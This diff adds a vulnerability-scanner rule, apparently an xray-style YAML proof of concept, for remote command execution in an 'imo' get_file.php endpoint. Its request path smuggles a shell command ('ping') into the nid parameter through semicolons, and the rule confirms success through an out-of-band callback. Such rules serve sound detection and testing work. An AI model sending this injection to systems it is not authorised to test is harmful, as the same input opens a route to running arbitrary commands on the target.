@@ -1,0 +1,14 @@
+name: imo_get_file_RCE
+set:
+  reverse: newReverse()
+  reverseURL: reverse.url.host
+rules:
+  r0:
+    request:
+      method: GET
+      path: /file/NDisk/get_file.php?cid=1&nid=;ping%20{{reverseURL}};
+    expression: reverse.wait(5)
+expression: r0()
+detail:
+    links:
+        - https://mp.weixin.qq.com/s/zW8oOiILwT4mywsrMJN1fQ
